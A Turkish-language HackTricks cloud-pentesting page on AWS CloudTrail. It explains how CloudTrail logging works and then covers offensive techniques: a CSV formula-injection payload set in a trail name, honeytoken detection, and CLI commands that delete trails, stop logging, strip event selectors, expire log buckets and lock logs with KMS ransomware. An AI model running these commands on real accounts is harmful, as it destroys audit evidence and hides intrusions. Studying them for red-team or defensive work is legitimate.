# AWS - CloudTrail Enum

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail, **AWS ortamınızdaki etkinlikleri kaydeder ve izler**. AWS kaynaklarıyla yapılan tüm etkileşimler için kimin ne yaptığını, ne zaman ve nereden yaptığını içeren ayrıntılı **olay günlüklerini** yakalar. Bu, güvenlik analizi, uyumluluk denetimi ve kaynak değişiklik takibi için bir denetim izi sağlar. CloudTrail, kullanıcı ve kaynak davranışını anlamak, güvenlik duruşunu artırmak ve yasal uyumluluğu sağlamak için gereklidir.

Her kaydedilen olay şunları içerir:

* Çağrılan API'nin adı: `eventName`
* Çağrılan hizmet: `eventSource`
* Zaman: `eventTime`
* IP adresi: `SourceIPAddress`
* Aracı yöntemi: `userAgent`. Örnekler:
* Signing.amazonaws.com - AWS Management Console'dan
* console.amazonaws.com - Hesabın kök kullanıcısı
* lambda.amazonaws.com - AWS Lambda
* İstek parametreleri: `requestParameters`
* Yanıt öğeleri: `responseElements`

Olaylar **yaklaşık her 5 dakikada bir JSON dosyasında yeni bir günlük dosyasına yazılır**, CloudTrail tarafından tutulur ve son olarak, günlük dosyaları **yaklaşık 15 dakika sonra S3'e teslim edilir**.\
CloudTrail günlükleri **hesaplar ve bölgeler arasında birleştirilebilir.**\
CloudTrail, **günlük dosyalarınızın CloudTrail tarafından size teslim edildiğinden beri değişmeden kaldığını doğrulamanıza olanak tanıyan günlük dosyası bütünlüğü kullanmanıza izin verir.** Günlüklerin içinde bir SHA-256 hash oluşturur. Yeni günlüklerin SHA-256 hash'i her saat oluşturulur.\
Bir Trail oluştururken, olay seçiciler size Trail'in yönetim, veri veya içgörü olaylarını kaydetmesini belirtmenize olanak tanır.

Günlükler bir S3 bucket'ında saklanır. Varsayılan olarak Sunucu Tarafı Şifreleme (SSE-S3) kullanılır, bu nedenle AWS, erişimi olan kişiler için içeriği şifreler, ancak ek güvenlik için KMS ve kendi anahtarlarınızla SSE kullanabilirsiniz.

Günlükler **bu ad formatına sahip bir S3 bucket'ında saklanır**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Örnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasörün içinde her günlük **şu formatı takip eden bir ada sahip olacaktır**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Günlük Dosyası Adlandırma Kuralları

![](<../../../../.gitbook/assets/image (122).png>)

Ayrıca, **dosya bütünlüğünü kontrol etmek için sindirim dosyaları** **aynı bucket'ın** içinde olacaktır:

![](<../../../../.gitbook/assets/image (195).png>)

### Birden Fazla Hesaptan Günlükleri Birleştirme

* Günlük dosyalarının teslim edileceği AWS hesabında bir Trial oluşturun
* CloudTrail için çapraz hesap erişimine izin veren ve erişime ihtiyaç duyan her AWS hesabına izin veren hedef S3 bucket'ına izinler uygulayın
* Diğer AWS hesaplarında yeni bir Trail oluşturun ve 1. adımda oluşturulan bucket'ı kullanmayı seçin

Ancak, tüm günlükleri aynı S3 bucket'ında saklayabilseniz bile, birden fazla hesaptan CloudTrail günlüklerini tek bir AWS hesabına ait CloudWatch Logs'a birleştiremezsiniz.

{% hint style="danger" %}
Bir hesabın **farklı günlükleri farklı bucket'larda saklayan** CloudTrail'den **etkinleştirilmiş** farklı Trail'lere sahip olabileceğini unutmayın.
{% endhint %}

### Tüm org hesaplarından tek bir Cloudtrail

Bir CloudTrail oluştururken, tüm org hesapları için cloudtrail'i etkinleştirmek ve günlükleri tek bir bucket'a almak mümkündür:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Bu şekilde, tüm hesapların tüm bölgelerinde CloudTrail'i kolayca yapılandırabilir ve günlükleri tek bir hesapta merkezileştirebilirsiniz (korumanız gereken hesap).

### Günlük Dosyalarını Kontrol Etme

Günlüklerin değiştirilmediğini kontrol edebilirsiniz

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail, şüpheli aktiviteler gerçekleştirildiğinde sizi uyaran uyarılar ayarlayabilmeniz için otomatik olarak logları CloudWatch'a gönderebilir.**\
CloudTrail'in logları CloudWatch'a göndermesine izin vermek için bir **rol** oluşturulması gerektiğini unutmayın. Mümkünse, bu işlemleri gerçekleştirmek için AWS varsayılan rolünü kullanmanız önerilir. Bu rol, CloudTrail'in şunları yapmasına izin verecektir:

* CreateLogStream: CloudWatch Logs log akışları oluşturmasına izin verir
* PutLogEvents: CloudTrail loglarını CloudWatch Logs log akışına teslim eder

### Event History

CloudTrail Event History, kaydedilen logları bir tabloda incelemenizi sağlar:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights**, CloudTrail yollarından yazma yönetim olaylarını otomatik olarak **analiz eder** ve sizi **olağandışı aktivitelere** karşı **uyarır**. Örneğin, belirlenmiş temel değerlerden farklı olarak `TerminateInstance` olaylarında bir artış olursa, bunu bir Insight olayı olarak görürsünüz. Bu olaylar, **olağandışı API aktivitelerini bulmayı ve yanıt vermeyi her zamankinden daha kolay hale getirir**.

Insight'lar, CloudTrail loglarının bulunduğu aynı kovada saklanır: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>Logların değiştirilip değiştirilmediğini (değiştirilmiş veya silinmiş) doğrulayın</li><li><p>Özet dosyaları kullanır (her dosya için hash oluşturur)</p><ul><li>SHA-256 hashing</li><li>SHA-256 ile RSA dijital imzalama</li><li>Amazon tarafından sahip olunan özel anahtar</li></ul></li><li>Özet dosyası oluşturmak 1 saat sürer (her saat başı yapılır)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAM politikaları ve S3 kova politikalarını kullanın</p><ul><li>güvenlik ekibi —> yönetici erişimi</li><li>denetçiler —> yalnızca okuma erişimi</li></ul></li><li>Logları şifrelemek için SSE-S3/SSE-KMS kullanın</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAM ve kova politikaları ile silme erişimini kısıtlayın</li><li>S3 MFA silmeyi yapılandırın</li><li>Log Dosyası Doğrulaması ile doğrulayın</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor, son 400 günün AWS **CloudTrail loglarına dayanarak içgörülerini toplar**. CloudTrail, bir AWS hesabında yapılan AWS API çağrılarının ve ilgili olayların geçmişini yakalar. Access Advisor, bu verileri kullanarak **hizmetlerin en son ne zaman erişildiğini gösterir**. CloudTrail loglarını analiz ederek, Access Advisor bir IAM kullanıcısının veya rolünün hangi AWS hizmetlerine eriştiğini ve bu erişimin ne zaman gerçekleştiğini belirleyebilir. Bu, AWS yöneticilerinin **izinleri iyileştirme** konusunda bilinçli kararlar almasına yardımcı olur, çünkü uzun süre erişilmeyen hizmetleri belirleyebilir ve gerçek kullanım kalıplarına dayalı olarak aşırı geniş izinleri potansiyel olarak azaltabilirler.

{% hint style="success" %}
Bu nedenle, Access Advisor, **kullanıcılara verilen gereksiz izinler hakkında bilgi verir** böylece yönetici bunları kaldırabilir
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail içinde CSV enjeksiyonu yapmak mümkündür ve bu, günlükler CSV olarak dışa aktarılıp Excel ile açıldığında rastgele kod çalıştıracaktır.\
Aşağıdaki kod, yükü içeren kötü bir Trail adıyla günlük girişi oluşturacaktır:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla bilgi için CSV Injections sayfasına bakın:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu özel teknik hakkında daha fazla bilgi için [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) adresine bakın.

## **Tespiti Atlatma**

### HoneyTokens **atlatma**

Honeytokens, **hassas bilgilerin sızdırılmasını tespit etmek** için oluşturulmuştur. AWS durumunda, **kullanımı izlenen AWS anahtarlarıdır**, eğer biri bu anahtarla bir işlem tetiklerse, o anahtarın çalınmış olması gerekir.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) tarafından oluşturulan Honeytokens, ya tanınabilir hesap adı kullanıyor ya da tüm müşterileri için aynı AWS hesap kimliğini kullanıyor. Bu nedenle, Cloudtrail'in herhangi bir günlük oluşturmasını sağlamadan hesap adını ve/veya hesap kimliğini alabilirseniz, **anahtarın bir honeytoken olup olmadığını bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57), bir anahtarın [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'a ait olup olmadığını tespit etmek için bazı kurallara sahiptir:**

* Eğer **`canarytokens.org`** rol adında görünüyorsa veya hata mesajında hesap kimliği **`534261010715`** görünüyorsa.
* Daha yakın zamanda test edildiğinde, hesap **`717712589309`** kullanılıyor ve hala adında **`canarytokens.com`** dizesi var.
* Hata mesajında rol adında **`SpaceCrab`** görünüyorsa
* **SpaceSiren**, kullanıcı adlarını oluşturmak için **uuids** kullanır: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Eğer **ad rastgele oluşturulmuş gibi görünüyorsa**, HoneyToken olma olasılığı yüksektir.

#### Anahtar Kimliğinden Hesap Kimliğini Almak

**Hesap Kimliği**'ni, **erişim anahtarı** içinde **kodlanmış** olarak [**burada açıklandığı gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) alabilir ve hesap kimliğini Honeytokens AWS hesaplarınızın listesiyle kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Daha fazla bilgi için [**orijinal araştırmaya**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) göz atın.

#### Günlük oluşturma

Bunun için en etkili teknik aslında basit bir yöntemdir. Bulduğunuz anahtarı kullanarak kendi saldırgan hesabınızda bir hizmete erişin. Bu, **CloudTrail'in KENDİ AWS hesabınızda bir günlük oluşturmasını sağlar, kurbanın hesabında değil**.

Çıktı size bir hata gösterecek ve hesap kimliği ile hesap adını belirtecektir, böylece **Honeytoken olup olmadığını görebileceksiniz**.

#### Günlük kaydı olmayan AWS hizmetleri

Geçmişte bazı **AWS hizmetleri CloudTrail'e günlük göndermezdi** (bir [listeyi burada bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazıları, yetkisiz biri (honeytoken anahtarı) erişmeye çalıştığında **anahtar rolünün ARN'sini** içeren bir **hata** ile yanıt verecektir.

Bu şekilde, bir **saldırgan herhangi bir günlük tetiklemeden anahtarın ARN'sini elde edebilir**. ARN'de saldırgan **AWS hesap kimliğini ve adını** görebilir, HoneyToken'ın şirket hesap kimliklerini ve adlarını bilmek kolaydır, bu şekilde bir saldırgan token'ın HoneyToken olup olmadığını belirleyebilir.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
CloudTrail günlükleri oluşturmayan tüm kamuya açık API'lerin şimdi düzeltildiğini unutmayın, bu yüzden belki kendi yöntemlerinizi bulmanız gerekebilir...

Daha fazla bilgi için [**orijinal araştırmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) göz atın.
{% endhint %}

### Üçüncü Altyapıya Erişim

Bazı AWS hizmetleri **veritabanları** veya **Kubernetes** kümeleri (EKS) gibi **altyapılar oluşturur**. Bir kullanıcı **doğrudan bu hizmetlerle konuştuğunda** (örneğin Kubernetes API'si gibi) **AWS API'sini kullanmaz**, bu nedenle CloudTrail bu iletişimi göremez.

Bu nedenle, EKS'ye erişimi olan ve EKS API'sinin URL'sini keşfeden bir kullanıcı, yerel olarak bir token oluşturabilir ve **CloudTrail tarafından tespit edilmeden API hizmetiyle doğrudan konuşabilir**.

Daha fazla bilgi için:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail Yapılandırmasını Değiştirme

#### İzleri silme
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop trails

AWS CloudTrail, AWS hesaplarındaki API çağrılarını kaydeden bir hizmettir. Bu hizmet, güvenlik analizi, izleme ve uyumluluk denetimleri için kullanılır. Ancak, kötü niyetli bir aktör, izlerini gizlemek için CloudTrail'i durdurabilir. Bu nedenle, CloudTrail'in durdurulması, güvenlik ekipleri tarafından dikkatle izlenmelidir.

```bash
aws cloudtrail stop-logging --name <trail-name>
```

Yukarıdaki komut, belirli bir trail'in kaydını durdurur. Bu komutun çalıştırılması, güvenlik olaylarının tespit edilmesini zorlaştırabilir.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Çok bölgeli kaydı devre dışı bırak

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Olay Seçicileri ile Günlük Kaydını Devre Dışı Bırakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

İlk örnekte, tek bir olay seçici, tek bir nesne ile bir JSON dizisi olarak sağlanmıştır. `"ReadWriteType": "ReadOnly"` **olay seçicinin yalnızca salt okunur olayları yakalaması gerektiğini** belirtir (bu nedenle CloudTrail içgörüleri **örneğin yazma** olaylarını kontrol etmeyecektir).

Olay seçiciyi özel gereksinimlerinize göre özelleştirebilirsiniz.

#### S3 yaşam döngüsü politikası ile logların silinmesi

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Bucket Yapılandırmasını Değiştirme

* S3 bucket'ını sil
* Bucket politikasını CloudTrail servisinden gelen yazma işlemlerini reddedecek şekilde değiştir
* S3 bucket'ına nesneleri silmek için yaşam döngüsü politikası ekle
* CloudTrail loglarını şifrelemek için kullanılan kms anahtarını devre dışı bırak

### Cloudtrail fidye yazılımı

#### S3 fidye yazılımı

**Asimetrik bir anahtar oluşturabilir** ve **CloudTrail'in verileri bu anahtarla şifrelemesini sağlayabilir** ve **özel anahtarı silebilirsiniz** böylece CloudTrail içerikleri kurtarılamaz.\
Bu temelde **S3-KMS fidye yazılımı** olarak açıklanmıştır:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS fidye yazılımı**

Bu, önceki saldırıyı farklı izin gereksinimleriyle gerçekleştirmek için en kolay yoldur:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS Hacking öğren & pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğren & pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol et!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katıl veya **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) bizi takip et.
* **HackTricks'e** [**PR göndererek**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna katkıda bulunarak hacking ipuçlarını paylaş.

</details>
{% endhint %}
